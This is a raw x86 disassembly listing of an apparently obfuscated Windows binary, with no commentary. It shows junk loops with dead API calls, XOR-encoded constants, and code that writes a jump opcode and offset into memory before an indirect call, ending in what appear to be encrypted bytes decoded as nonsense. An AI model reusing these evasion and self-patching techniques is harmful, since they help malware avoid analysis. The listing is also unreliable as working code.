  40d8d8:	mov    eax,DWORD PTR [eax]
  40d8da:	and    DWORD PTR ds:0x43365b,0x0
  40d8e4:	jmp    0x40d8f8
  40d8e9:	xor    edi,edi
  40d8eb:	or     edi,DWORD PTR ds:0x43365b
  40d8f1:	inc    edi
  40d8f2:	mov    DWORD PTR ds:0x43365b,edi
  40d8f8:	cmp    DWORD PTR ds:0x43365b,0x1c
  40d8ff:	jae    0x40d922
  40d905:	cmp    DWORD PTR ds:0x43365b,0x25
  40d90c:	jne    0x40d91d
  40d912:	push   0x6b44
  40d917:	call   DWORD PTR ds:0x4121a4
  40d91d:	jmp    0x40d8e9
  40d922:	mov    ecx,DWORD PTR [ebp-0x14]
  40d925:	sbb    DWORD PTR ds:0x4335a7,0x43365f
  40d92f:	mov    esi,0x7510853
  40d934:	movzx  edi,BYTE PTR ds:0x433553
  40d93b:	and    edi,DWORD PTR ds:0x43362f
  40d941:	mov    DWORD PTR ds:0x433553,edi
  40d947:	xor    eax,esi
  40d949:	mov    DWORD PTR ds:0x4335a7,0x13
  40d953:	cmp    DWORD PTR ds:0x4335a7,0x0
  40d95a:	je     0x40d9b9
  40d960:	cmp    DWORD PTR ds:0x4335a7,0x3
  40d967:	jne    0x40d985
  40d96d:	push   0x5b51
  40d972:	push   DWORD PTR [ebp-0x18]
  40d975:	push   0x1bb9
  40d97a:	push   0x295c
  40d97f:	call   DWORD PTR ds:0x412278
  40d985:	cmp    DWORD PTR ds:0x4335a7,0x4
  40d98c:	jne    0x40d99f
  40d992:	mov    edi,DWORD PTR ds:0x4335a7
  40d998:	dec    edi
  40d999:	mov    DWORD PTR ds:0x4335a7,edi
  40d99f:	xor    edi,edi
  40d9a1:	add    edi,DWORD PTR ds:0x4335a7
  40d9a7:	dec    edi
  40d9a8:	mov    DWORD PTR ds:0x4335a7,edi
  40d9ae:	jmp    0x40d953
  40d9b3:	xor    ebx,DWORD PTR ds:0x43354f
  40d9b9:	mov    edi,0x32729a
  40d9be:	add    eax,edi
  40d9c0:	mov    DWORD PTR [ecx],eax
  40d9c2:	mov    eax,ds:0x413dda
  40d9c7:	mov    DWORD PTR ds:0x4335db,ecx
  40d9cd:	cmp    eax,0x22c02f45
  40d9d2:	mov    DWORD PTR ds:0x4335f3,ecx
  40d9d8:	mov    eax,DWORD PTR [ebp-0x4]
  40d9db:	mov    ebx,DWORD PTR ds:0x43359f
  40d9e1:	mov    ebx,0xf89c8539
  40d9e6:	je     0x40da18
  40d9ec:	sub    DWORD PTR ds:0x43355f,edx
  40d9f2:	mov    ecx,DWORD PTR [ebp-0x24]
  40d9f5:	xor    eax,esi
  40d9f7:	add    eax,edi
  40d9f9:	imul   eax,ecx
  40d9fc:	mov    DWORD PTR ds:0x433663,0x5372
  40da06:	mov    DWORD PTR [ebp-0x24],eax
  40da09:	mov    DWORD PTR ds:0x4335eb,0x4650
  40da13:	jmp    0x40db46
  40da18:	xor    eax,esi
  40da1a:	movzx  ecx,WORD PTR ds:0x43354f
  40da21:	sub    DWORD PTR ds:0x433567,ecx
  40da27:	add    eax,edi
  40da29:	mov    ds:0x413c2a,eax
  40da2e:	xor    DWORD PTR ds:0x43355b,edi
  40da34:	mov    eax,DWORD PTR [ebp-0x24]
  40da37:	xor    eax,esi
  40da39:	and    DWORD PTR ds:0x43362f,0x0
  40da43:	jmp    0x40da55
  40da48:	mov    ecx,DWORD PTR ds:0x43362f
  40da4e:	inc    ecx
  40da4f:	mov    DWORD PTR ds:0x43362f,ecx
  40da55:	cmp    DWORD PTR ds:0x43362f,0x19
  40da5c:	jae    0x40da9d
  40da62:	cmp    DWORD PTR ds:0x43362f,0xe
  40da69:	jne    0x40da78
  40da6f:	push   DWORD PTR [ebp-0x14]
  40da72:	call   DWORD PTR ds:0x41227c
  40da78:	cmp    DWORD PTR ds:0x43362f,0xd
  40da7f:	jne    0x40da92
  40da85:	mov    ecx,DWORD PTR ds:0x43362f
  40da8b:	inc    ecx
  40da8c:	mov    DWORD PTR ds:0x43362f,ecx
  40da92:	jmp    0x40da48
  40da97:	sbb    DWORD PTR ds:0x43365b,edx
  40da9d:	add    eax,edi
  40da9f:	and    DWORD PTR ds:0x433597,0x0
  40daa9:	jmp    0x40dabd
  40daae:	xor    ecx,ecx
  40dab0:	or     ecx,DWORD PTR ds:0x433597
  40dab6:	inc    ecx
  40dab7:	mov    DWORD PTR ds:0x433597,ecx
  40dabd:	cmp    DWORD PTR ds:0x433597,0x15
  40dac4:	jae    0x40daf7
  40daca:	cmp    DWORD PTR ds:0x433597,0x1c
  40dad1:	jne    0x40daf2
  40dad7:	push   0x1c72
  40dadc:	push   DWORD PTR [ebp-0xc]
  40dadf:	push   DWORD PTR [ebp-0x14]
  40dae2:	push   0x433874
  40dae7:	push   0x400000
  40daec:	call   DWORD PTR ds:0x412280
  40daf2:	jmp    0x40daae
  40daf7:	mov    ds:0x413dda,eax
  40dafc:	mov    eax,DWORD PTR [ebp-0x4]
  40daff:	or     DWORD PTR ds:0x433563,0x6d3e
  40db09:	mov    ecx,DWORD PTR ds:0x413c2a
  40db0f:	adc    DWORD PTR ds:0x4335a7,0x43354f
  40db19:	xor    eax,esi
  40db1b:	adc    DWORD PTR ds:0x433657,0x260d
  40db25:	add    eax,edi
  40db27:	cmp    ecx,eax
  40db29:	mov    DWORD PTR ds:0x433543,0x58a9
  40db33:	jne    0x40db46
  40db39:	push   ebx
  40db3a:	push   DWORD PTR [ebp-0x4]
  40db3d:	push   DWORD PTR [ebp-0x24]
  40db40:	call   DWORD PTR ds:0x413c22
  40db46:	or     DWORD PTR ds:0x433547,0x68cd
  40db50:	mov    eax,ds:0x413b16
  40db55:	mov    ecx,DWORD PTR ds:0x4335cf
  40db5b:	mov    ecx,DWORD PTR [ecx]
  40db5d:	or     DWORD PTR ds:0x433563,ecx
  40db63:	mov    eax,DWORD PTR [eax+0x18c]
  40db69:	and    DWORD PTR ds:0x43361f,0x0
  40db73:	mov    ecx,DWORD PTR ds:0x43361f
  40db79:	inc    ecx
  40db7a:	mov    DWORD PTR ds:0x43361f,ecx
  40db80:	cmp    DWORD PTR ds:0x43361f,0x21
  40db87:	jne    0x40db9d
  40db8d:	push   0x43361f
  40db92:	push   0x4b8b
  40db97:	call   DWORD PTR ds:0x4121a8
  40db9d:	cmp    DWORD PTR ds:0x43361f,0x1b
  40dba4:	jb     0x40db73
  40dbaa:	mov    eax,DWORD PTR [eax]
  40dbac:	sbb    DWORD PTR ds:0x43359f,0x7dd1
  40dbb6:	mov    DWORD PTR [ebp-0x44],eax
  40dbb9:	mov    DWORD PTR ds:0x433627,0x12
  40dbc3:	cmp    DWORD PTR ds:0x433627,0x0
  40dbca:	je     0x40dc20
  40dbd0:	cmp    DWORD PTR ds:0x433627,0x6
  40dbd7:	jne    0x40dbf0
  40dbdd:	push   0x2c3a
  40dbe2:	push   0x433667
  40dbe7:	push   DWORD PTR [ebp-0x20]
  40dbea:	call   DWORD PTR ds:0x4121ac
  40dbf0:	cmp    DWORD PTR ds:0x433627,0x7
  40dbf7:	jne    0x40dc0a
  40dbfd:	mov    ecx,DWORD PTR ds:0x433627
  40dc03:	dec    ecx
  40dc04:	mov    DWORD PTR ds:0x433627,ecx
  40dc0a:	xor    ecx,ecx
  40dc0c:	or     ecx,DWORD PTR ds:0x433627
  40dc12:	dec    ecx
  40dc13:	mov    DWORD PTR ds:0x433627,ecx
  40dc19:	jmp    0x40dbc3
  40dc1e:	xor    edx,eax
  40dc20:	mov    DWORD PTR [ebp-0x10],ebx
  40dc23:	and    DWORD PTR ds:0x433617,0x0
  40dc2d:	xor    eax,eax
  40dc2f:	or     eax,DWORD PTR ds:0x433617
  40dc35:	inc    eax
  40dc36:	mov    ds:0x433617,eax
  40dc3b:	cmp    DWORD PTR ds:0x433617,0x5
  40dc42:	jne    0x40dc5a
  40dc48:	push   0x433775
  40dc4d:	push   0x1
  40dc4f:	push   0x1
  40dc51:	push   DWORD PTR [ebp-0x20]
  40dc54:	call   DWORD PTR ds:0x4121b0
  40dc5a:	cmp    DWORD PTR ds:0x433617,0x4
  40dc61:	jne    0x40dc72
  40dc67:	mov    eax,ds:0x433617
  40dc6c:	inc    eax
  40dc6d:	mov    ds:0x433617,eax
  40dc72:	cmp    DWORD PTR ds:0x433617,0x18
  40dc79:	jb     0x40dc2d
  40dc7f:	and    DWORD PTR ds:0x43354b,ecx
  40dc85:	mov    DWORD PTR [ebp-0x10],ebx
  40dc88:	mov    DWORD PTR [ebp-0x10],ebx
  40dc8b:	sbb    DWORD PTR ds:0x433547,ebx
  40dc91:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40dc98:	and    DWORD PTR ds:0x433673,0x6700
  40dca2:	mov    DWORD PTR [ebp-0x10],ebx
  40dca5:	and    DWORD PTR ds:0x43359f,0x0
  40dcaf:	jmp    0x40dcc1
  40dcb4:	mov    ecx,DWORD PTR ds:0x43359f
  40dcba:	inc    ecx
  40dcbb:	mov    DWORD PTR ds:0x43359f,ecx
  40dcc1:	cmp    DWORD PTR ds:0x43359f,0x1d
  40dcc8:	jae    0x40dd19
  40dcce:	cmp    DWORD PTR ds:0x43359f,0x7
  40dcd5:	jne    0x40dce4
  40dcdb:	push   DWORD PTR [ebp-0x1c]
  40dcde:	call   DWORD PTR ds:0x4121b4
  40dce4:	cmp    DWORD PTR ds:0x43359f,0x6
  40dceb:	jne    0x40dd00
  40dcf1:	xor    ecx,ecx
  40dcf3:	add    ecx,DWORD PTR ds:0x43359f
  40dcf9:	inc    ecx
  40dcfa:	mov    DWORD PTR ds:0x43359f,ecx
  40dd00:	jmp    0x40dcb4
  40dd05:	xor    edx,edx
  40dd07:	or     edx,DWORD PTR ds:0x4335a7
  40dd0d:	sbb    edx,DWORD PTR ds:0x433667
  40dd13:	mov    DWORD PTR ds:0x4335a7,edx
  40dd19:	mov    DWORD PTR [ebp-0x10],0xf89c853d
  40dd20:	mov    ecx,DWORD PTR ds:0x43366b
  40dd26:	or     DWORD PTR ds:0x43361b,ecx
  40dd2c:	mov    eax,DWORD PTR [ebp-0x24]
  40dd2f:	sbb    edx,ecx
  40dd31:	mov    ecx,DWORD PTR [ebp-0x4]
  40dd34:	mov    edx,DWORD PTR ds:0x4335b3
  40dd3a:	and    DWORD PTR ds:0x43361f,edx
  40dd40:	mov    edx,DWORD PTR [ebp-0x4]
  40dd43:	xor    edx,esi
  40dd45:	xor    ecx,esi
  40dd47:	add    ecx,edx
  40dd49:	mov    edx,DWORD PTR [ebp-0x4]
  40dd4c:	xor    eax,esi
  40dd4e:	xor    edx,esi
  40dd50:	add    eax,edi
  40dd52:	mov    DWORD PTR ds:0x433557,0x7934
  40dd5c:	lea    ecx,[ecx+edx*1+0x9757ce]
  40dd63:	mov    DWORD PTR ds:0x43354f,0x1f1b
  40dd6d:	mov    DWORD PTR [ebp-0x20],eax
  40dd70:	mov    DWORD PTR ds:0x43355b,0xf60
  40dd7a:	cmp    eax,ecx
  40dd7c:	mov    DWORD PTR ds:0x43366b,0x7c7a
  40dd86:	ja     0x40dec6
  40dd8c:	jmp    0x40dd9e
  40dd91:	sbb    DWORD PTR ds:0x43361b,0x74d8
  40dd9b:	mov    eax,DWORD PTR [ebp-0x20]
  40dd9e:	and    DWORD PTR ds:0x43355b,edi
  40dda4:	mov    ecx,DWORD PTR [ebp-0x4]
  40dda7:	or     DWORD PTR ds:0x4335a7,0x43362f
  40ddb1:	xor    ecx,esi
  40ddb3:	adc    DWORD PTR ds:0x43365f,0x2704
  40ddbd:	lea    eax,[ecx+eax*1+0x32729a]
  40ddc4:	and    DWORD PTR ds:0x43359f,0x7330
  40ddce:	push   eax
  40ddcf:	mov    eax,DWORD PTR [ebp-0x14]
  40ddd2:	xor    eax,esi
  40ddd4:	and    DWORD PTR ds:0x43355b,0x43362f
  40ddde:	lea    eax,[ebp+eax*1+0x3272a2]
  40dde5:	push   eax
  40dde6:	mov    eax,ds:0x43354b
  40ddeb:	or     DWORD PTR ds:0x4335df,eax
  40ddf1:	mov    eax,ds:0x413b16
  40ddf6:	push   DWORD PTR [eax+0x1bc]
  40ddfc:	adc    DWORD PTR ds:0x43365b,0x4335b3
  40de06:	call   0x403290
  40de0b:	add    DWORD PTR ds:0x433663,0x32bd
  40de15:	mov    eax,DWORD PTR [ebp-0x4]
  40de18:	mov    ecx,DWORD PTR [ebp-0x20]
  40de1b:	sbb    DWORD PTR ds:0x4335ef,ecx
  40de21:	xor    eax,esi
  40de23:	and    DWORD PTR ds:0x4335ab,0x0
  40de2d:	mov    edx,DWORD PTR ds:0x4335ab
  40de33:	inc    edx
  40de34:	mov    DWORD PTR ds:0x4335ab,edx
  40de3a:	cmp    DWORD PTR ds:0x4335ab,0x23
  40de41:	jne    0x40de57
  40de47:	push   0x303f
  40de4c:	push   0x8a6d
  40de51:	call   DWORD PTR ds:0x4121b8
  40de57:	cmp    DWORD PTR ds:0x4335ab,0x15
  40de5e:	jb     0x40de2d
  40de64:	lea    eax,[ecx+eax*1+0x32729a]
  40de6b:	sbb    DWORD PTR ds:0x433667,0x3009
  40de75:	mov    ecx,DWORD PTR [ebp-0x4]
  40de78:	mov    edx,DWORD PTR [ebp-0x4]
  40de7b:	xor    edx,esi
  40de7d:	add    DWORD PTR ds:0x43361b,0x46c0
  40de87:	xor    ecx,esi
  40de89:	xor    DWORD PTR ds:0x433657,0x4fa5
  40de93:	add    ecx,edx
  40de95:	and    edx,DWORD PTR ds:0x433663
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	adc    DWORD PTR ds:0x433597,0x7c2
  40dea8:	xor    edx,esi
  40deaa:	lea    ecx,[ecx+edx*1+0x9757ce]
  40deb1:	mov    DWORD PTR [ebp-0x20],eax
  40deb4:	cmp    eax,ecx
  40deb6:	mov    DWORD PTR ds:0x4335e7,0x1689
  40dec0:	jbe    0x40dd91
  40dec6:	mov    eax,DWORD PTR [ebp+0xc]
  40dec9:	mov    ds:0x41399a,eax
  40dece:	mov    eax,DWORD PTR [ebp+0x10]
  40ded1:	mov    ds:0x413bee,eax
  40ded6:	mov    eax,ds:0x41399a
  40dedb:	mov    ecx,DWORD PTR [ebp-0x18]
  40dede:	push   DWORD PTR [ebp-0x44]
  40dee1:	sub    eax,edi
  40dee3:	push   DWORD PTR [ebp-0x30]
  40dee6:	xor    eax,esi
  40dee8:	mov    DWORD PTR [ecx],eax
  40deea:	push   DWORD PTR [ebp-0x2c]
  40deed:	call   0x40e1d3
  40def2:	sub    eax,edi
  40def4:	xor    eax,esi
  40def6:	mov    DWORD PTR [ebp+0xc],eax
  40def9:	mov    ecx,DWORD PTR [ebp-0x4]
  40defc:	mov    eax,DWORD PTR [ebp+0xc]
  40deff:	xor    ecx,esi
  40df01:	add    ecx,edi
  40df03:	xor    edx,edx
  40df05:	div    ecx
  40df07:	mov    ecx,DWORD PTR [ebp-0x24]
  40df0a:	cmp    ecx,eax
  40df0c:	jne    0x40e135
  40df12:	mov    eax,ds:0x413b16
  40df17:	mov    DWORD PTR [ebp+0x10],eax
  40df1a:	mov    eax,ds:0x413c26
  40df1f:	mov    DWORD PTR [ebp-0x50],eax
  40df22:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40df29:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  40df30:	mov    DWORD PTR [ebp-0x4c],0xf89cb535
  40df37:	mov    DWORD PTR [ebp-0x64],0xf89f0535
  40df3e:	mov    DWORD PTR [ebp-0x60],0xf89c85f5
  40df45:	mov    DWORD PTR [ebp-0x54],0xf89c85d5
  40df4c:	mov    eax,DWORD PTR [ebp-0x18]
  40df4f:	xor    eax,esi
  40df51:	add    eax,edi
  40df53:	mov    DWORD PTR [ebp-0xc],eax
  40df56:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40df5d:	mov    BYTE PTR [ebp-0x25],0x67
  40df61:	mov    eax,DWORD PTR [ebp-0x18]
  40df64:	xor    eax,esi
  40df66:	add    eax,edi
  40df68:	mov    DWORD PTR [ebp-0xc],eax
  40df6b:	mov    eax,DWORD PTR [ebp-0x54]
  40df6e:	xor    eax,esi
  40df70:	add    eax,edi
  40df72:	mov    DWORD PTR [ebp-0x40],eax
  40df75:	mov    eax,DWORD PTR [ebp-0x4c]
  40df78:	xor    eax,esi
  40df7a:	add    eax,edi
  40df7c:	mov    DWORD PTR [ebp-0x38],eax
  40df7f:	mov    eax,DWORD PTR [ebp-0x3c]
  40df82:	xor    eax,esi
  40df84:	add    eax,edi
  40df86:	mov    DWORD PTR [ebp-0x34],eax
  40df89:	lea    eax,[ebp-0xa8]
  40df8f:	mov    DWORD PTR [ebp+0xc],eax
  40df92:	mov    eax,DWORD PTR [ebp-0x18]
  40df95:	mov    DWORD PTR [ebp-0x14],eax
  40df98:	mov    eax,DWORD PTR [ebp-0x20]
  40df9b:	mov    DWORD PTR [ebp-0x5c],ebx
  40df9e:	mov    DWORD PTR [ebp-0x10],eax
  40dfa1:	mov    eax,DWORD PTR [ebp-0x5c]
  40dfa4:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfa7:	xor    eax,esi
  40dfa9:	add    eax,0x32729a
  40dfae:	mov    DWORD PTR [ecx],eax
  40dfb0:	mov    eax,DWORD PTR [ebp-0x14]
  40dfb3:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfb6:	xor    eax,esi
  40dfb8:	add    eax,edi
  40dfba:	mov    DWORD PTR [ecx+0x4],eax
  40dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  40dfc0:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfc3:	mov    DWORD PTR [ecx+0x8],eax
  40dfc6:	mov    eax,DWORD PTR [ebp-0x38]
  40dfc9:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfcc:	mov    DWORD PTR [ecx+0xc],eax
  40dfcf:	mov    eax,DWORD PTR [ebp-0x40]
  40dfd2:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd5:	mov    DWORD PTR [ecx+0x10],eax
  40dfd8:	mov    eax,eax
  40dfda:	mov    eax,DWORD PTR [ebp-0x10]
  40dfdd:	xor    eax,esi
  40dfdf:	add    eax,edi
  40dfe1:	je     0x40e012
  40dfe7:	lea    eax,[ebp-0xa8]
  40dfed:	push   eax
  40dfee:	mov    eax,DWORD PTR [ebp-0x20]
  40dff1:	xor    eax,esi
  40dff3:	add    eax,edi
  40dff5:	push   eax
  40dff6:	mov    eax,DWORD PTR [ebp+0x10]
  40dff9:	add    eax,0xaa
  40dffe:	push   eax
  40dfff:	mov    eax,DWORD PTR [ebp+0x10]
  40e002:	mov    eax,DWORD PTR [eax+0x198]
  40e008:	push   DWORD PTR [eax]
  40e00a:	call   0x4100b5
  40e00f:	mov    DWORD PTR [ebp-0x8],eax
  40e012:	cmp    DWORD PTR [ebp-0x8],0x0
  40e016:	je     0x40e135
  40e01c:	lea    eax,[ebp-0xc]
  40e01f:	mov    DWORD PTR [ebp-0x38],eax
  40e022:	mov    eax,DWORD PTR [ebp-0x60]
  40e025:	xor    eax,esi
  40e027:	add    eax,edi
  40e029:	mov    DWORD PTR [ebp-0x40],eax
  40e02c:	mov    eax,DWORD PTR [ebp-0x3c]
  40e02f:	xor    eax,esi
  40e031:	add    eax,edi
  40e033:	mov    DWORD PTR [ebp-0x10],eax
  40e036:	mov    eax,DWORD PTR [ebp-0x8]
  40e039:	mov    DWORD PTR [ebp-0x14],eax
  40e03c:	lea    eax,[ebp-0xa8]
  40e042:	mov    DWORD PTR [ebp+0xc],eax
  40e045:	mov    eax,DWORD PTR [ebp-0x18]
  40e048:	mov    DWORD PTR [ebp-0x18],eax
  40e04b:	mov    eax,DWORD PTR [ebp-0x20]
  40e04e:	mov    DWORD PTR [ebp-0x48],ebx
  40e051:	mov    DWORD PTR [ebp-0x34],eax
  40e054:	mov    eax,DWORD PTR [ebp-0x48]
  40e057:	mov    ecx,DWORD PTR [ebp+0xc]
  40e05a:	xor    eax,esi
  40e05c:	add    eax,0x32729a
  40e061:	mov    DWORD PTR [ecx],eax
  40e063:	mov    eax,DWORD PTR [ebp-0x14]
  40e066:	mov    ecx,DWORD PTR [ebp+0xc]
  40e069:	mov    DWORD PTR [ecx+0x4],eax
  40e06c:	mov    eax,DWORD PTR [ebp-0x10]
  40e06f:	mov    ecx,DWORD PTR [ebp+0xc]
  40e072:	mov    DWORD PTR [ecx+0x8],eax
  40e075:	mov    eax,DWORD PTR [ebp-0x40]
  40e078:	mov    ecx,DWORD PTR [ebp+0xc]
  40e07b:	mov    DWORD PTR [ecx+0xc],eax
  40e07e:	mov    eax,DWORD PTR [ebp-0x38]
  40e081:	mov    ecx,DWORD PTR [ebp+0xc]
  40e084:	mov    DWORD PTR [ecx+0x10],eax
  40e087:	mov    eax,eax
  40e089:	mov    eax,DWORD PTR [ebp-0x14]
  40e08c:	test   eax,eax
  40e08e:	mov    eax,DWORD PTR [ebp-0x34]
  40e091:	jne    0x40e09a
  40e097:	mov    eax,DWORD PTR [ebp-0x18]
  40e09a:	xor    eax,esi
  40e09c:	add    eax,edi
  40e09e:	test   eax,eax
  40e0a0:	je     0x40e0ce
  40e0a6:	lea    eax,[ebp-0xa8]
  40e0ac:	push   eax
  40e0ad:	mov    eax,DWORD PTR [ebp-0x20]
  40e0b0:	xor    eax,esi
  40e0b2:	add    eax,edi
  40e0b4:	push   eax
  40e0b5:	mov    eax,DWORD PTR [ebp+0x10]
  40e0b8:	add    eax,0xee
  40e0bd:	push   eax
  40e0be:	mov    eax,DWORD PTR [ebp+0x10]
  40e0c1:	mov    eax,DWORD PTR [eax+0x198]
  40e0c7:	push   DWORD PTR [eax]
  40e0c9:	call   0x4100b5
  40e0ce:	mov    ecx,DWORD PTR [ebp-0x3c]
  40e0d1:	xor    ecx,esi
  40e0d3:	mov    eax,0xffcd8d66
  40e0d8:	sub    eax,ecx
  40e0da:	sub    eax,DWORD PTR [ebp-0x8]
  40e0dd:	mov    ecx,DWORD PTR [ebp-0x50]
  40e0e0:	add    ecx,eax
  40e0e2:	mov    eax,DWORD PTR [ebp-0x8]
  40e0e5:	mov    DWORD PTR [eax+0x1],ecx
  40e0e8:	mov    al,BYTE PTR [ebp-0x25]
  40e0eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ee:	xor    al,0x45
  40e0f0:	sub    al,0x39
  40e0f2:	mov    BYTE PTR [ecx],al
  40e0f4:	lea    eax,[ebp-0x8]
  40e0f7:	inc    BYTE PTR [eax]
  40e0f9:	inc    eax
  40e0fa:	push   eax
  40e0fb:	pop    ecx
  40e0fc:	dec    ecx
  40e0fd:	xchg   ecx,edx
  40e0ff:	dec    BYTE PTR [edx]
  40e101:	push   DWORD PTR [ebp+0x10]
  40e104:	mov    eax,ds:0x413bd2
  40e109:	mov    eax,DWORD PTR [eax]
  40e10b:	push   DWORD PTR [eax]
  40e10d:	lea    eax,ds:0x413bee
  40e113:	push   DWORD PTR [eax]
  40e115:	lea    eax,ds:0x41399a
  40e11b:	push   DWORD PTR [eax]
  40e11d:	lea    eax,ds:0x413bce
  40e123:	push   DWORD PTR [eax]
  40e125:	lea    eax,ds:0x413d06
  40e12b:	push   DWORD PTR [eax]
  40e12d:	xchg   ebx,edx
  40e12f:	inc    ebx
  40e130:	push   ebx
  40e131:	pop    eax
  40e132:	call   DWORD PTR [eax-0x1]
  40e135:	lea    eax,[ebp+0x4]
  40e138:	mov    DWORD PTR [ebp-0x58],eax
  40e13b:	mov    eax,ds:0x413b16
  40e140:	push   0x4
  40e142:	add    eax,0x1cc
  40e147:	push   eax
  40e148:	lea    eax,[ebp-0x1c]
  40e14b:	push   eax
  40e14c:	call   0x403290
  40e151:	mov    eax,DWORD PTR [ebp-0x1c]
  40e154:	mov    eax,DWORD PTR [ebp-0x4]
  40e157:	mov    eax,DWORD PTR [ebp-0x24]
  40e15a:	mov    DWORD PTR [ebp+0xc],eax
  40e15d:	mov    eax,ds:0x413b9a
  40e162:	mov    ecx,DWORD PTR [ebp+0xc]
  40e165:	sub    eax,edi
  40e167:	xor    eax,esi
  40e169:	cmp    eax,ecx
  40e16b:	je     0x40e1b2
  40e171:	mov    eax,ds:0x413b92
  40e176:	mov    ecx,DWORD PTR [ebp+0xc]
  40e179:	sub    eax,edi
  40e17b:	xor    eax,esi
  40e17d:	cmp    eax,ecx
  40e17f:	jne    0x40e195
  40e185:	mov    eax,ds:0x413b9a
  40e18a:	add    eax,DWORD PTR ds:0x413b92
  40e190:	jmp    0x40e19c
  40e195:	mov    eax,DWORD PTR [ebp+0xc]
  40e198:	xor    eax,esi
  40e19a:	add    eax,edi
  40e19c:	mov    ds:0x413b92,eax
  40e1a1:	mov    eax,DWORD PTR [ebp+0xc]
  40e1a4:	xor    eax,esi
  40e1a6:	add    eax,edi
  40e1a8:	mov    ds:0x413b9a,eax
  40e1ad:	jmp    0x40e1bc
  40e1b2:	mov    eax,ds:0x413b9a
  40e1b7:	mov    ds:0x413b92,eax
  40e1bc:	mov    eax,DWORD PTR [ebp-0x58]
  40e1bf:	mov    ecx,DWORD PTR ds:0x413b92
  40e1c5:	add    DWORD PTR [eax],ecx
  40e1c7:	mov    eax,DWORD PTR [ebp-0x1c]
  40e1ca:	mov    eax,DWORD PTR [eax]
  40e1cc:	pop    edi
  40e1cd:	pop    esi
  40e1ce:	pop    ebx
  40e1cf:	leave  
  40e1d0:	ret    0xc
  40e1d3:	push   ebp
  40e1d4:	mov    ebp,esp
  40e1d6:	push   ecx
  40e1d7:	push   ecx
  40e1d8:	mov    DWORD PTR ds:0x433557,0x1ded
  40e1e2:	mov    eax,0xf89c8534
  40e1e7:	mov    ecx,DWORD PTR ds:0x4335df
  40e1ed:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40e1f4:	push   esi
  40e1f5:	mov    esi,0x7be1
  40e1fa:	mov    DWORD PTR [ebp-0x8],eax
  40e1fd:	mov    ecx,DWORD PTR [ebp+0x8]
  40e200:	push   edi
  40e201:	mov    DWORD PTR ds:0x43362b,0x40de
  40e20b:	mov    edi,0x7510853
  40e210:	mov    esi,DWORD PTR ds:0x4335af
  40e216:	mov    esi,0x32729a
  40e21b:	cmp    ecx,eax
  40e21d:	mov    DWORD PTR ds:0x433617,0x680f
  40e227:	je     0x40eaa5
  40e22d:	and    DWORD PTR ds:0x433627,0x0
  40e237:	mov    ecx,DWORD PTR ds:0x433627
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR ds:0x433627,ecx
  40e244:	cmp    DWORD PTR ds:0x433627,0xa
  40e24b:	jne    0x40e25f
  40e251:	push   0x15e8
  40e256:	push   DWORD PTR [ebp-0x10]
  40e259:	call   DWORD PTR ds:0x4120d0
  40e25f:	cmp    DWORD PTR ds:0x433627,0x9
  40e266:	jne    0x40e279
  40e26c:	mov    ecx,DWORD PTR ds:0x433627
  40e272:	inc    ecx
  40e273:	mov    DWORD PTR ds:0x433627,ecx
  40e279:	cmp    DWORD PTR ds:0x433627,0x14
  40e280:	jb     0x40e237
  40e286:	or     ecx,eax
  40e288:	mov    eax,DWORD PTR [ebp-0x4]
  40e28b:	mov    ecx,DWORD PTR [ebp+0xc]
  40e28e:	sbb    DWORD PTR ds:0x43365b,0x433547
  40e298:	xor    eax,edi
  40e29a:	add    eax,esi
  40e29c:	cmp    eax,ecx
  40e29e:	je     0x40eaa5
  40e2a4:	and    eax,0x1e6e
  40e2a9:	mov    eax,DWORD PTR [ebp-0x4]
  40e2ac:	and    DWORD PTR ds:0x4335eb,0x0
  40e2b6:	mov    edx,DWORD PTR ds:0x4335eb
  40e2bc:	inc    edx
  40e2bd:	mov    DWORD PTR ds:0x4335eb,edx
  40e2c3:	cmp    DWORD PTR ds:0x4335eb,0x20
  40e2ca:	jne    0x40e2e0
  40e2d0:	push   0x433874
  40e2d5:	push   0x433874
  40e2da:	call   DWORD PTR ds:0x4121bc
  40e2e0:	cmp    DWORD PTR ds:0x4335eb,0x1f
  40e2e7:	jb     0x40e2b6
  40e2ed:	xor    eax,edi
  40e2ef:	add    eax,esi
  40e2f1:	push   eax
  40e2f2:	push   DWORD PTR [ebp-0x8]
  40e2f5:	push   DWORD PTR [ebp-0x4]
  40e2f8:	mov    edx,DWORD PTR ds:0x413b16
  40e2fe:	call   0x40f9cd
  40e303:	mov    ecx,DWORD PTR ds:0x413b16
  40e309:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e30f:	jmp    0x40e6d5
  40e314:	cmp    BYTE PTR [ebp*1+0x6055fdb9],dh
  40e31b:	mov    ebp,0x9445ce55
  40e320:	retf   
  40e321:	out    0x6e,eax
  40e323:	dec    ebx
  40e324:	lds    esp,FWORD PTR [esp+edi*2+0x7c79a77c]
  40e32b:	jl     0x40e391
  40e32d:	mov    dl,0x34
  40e32f:	cmp    ecx,DWORD PTR ds:0xf76731ff
  40e335:	hlt    
  40e336:	and    eax,0x6447b74e
  40e33b:	fldcw  WORD PTR [eax-0x6630b05]
  40e341:	dec    edi
  40e342:	jmp    0x40e35b
  40e344:	mov    BYTE PTR [edi+0xa],cl
  40e347:	inc    edi
  40e348:	pushf  
  40e349:	cdq    
  40e34a:	dec    eax
  40e34b:	inc    edx
  40e34c:	icebp  
  40e34d:	inc    ebx
  40e34e:	fs stos BYTE PTR es:[edi],al
  40e350:	xchg   ebp,eax
  40e351:	fcomip st,st(3)
  40e353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e354:	dec    ecx
  40e355:	mov    bl,0x77
  40e357:	clc    
  40e358:	imul   ecx,DWORD PTR [ecx],0xffffffe8
  40e35b:	mov    al,ds:0x10a43a9e
  40e360:	pushf  
  40e361:	jecxz  0x40e2e9
  40e363:	lea    eax,[ebx+0xe]
  40e366:	out    dx,al
  40e367:	push   esp
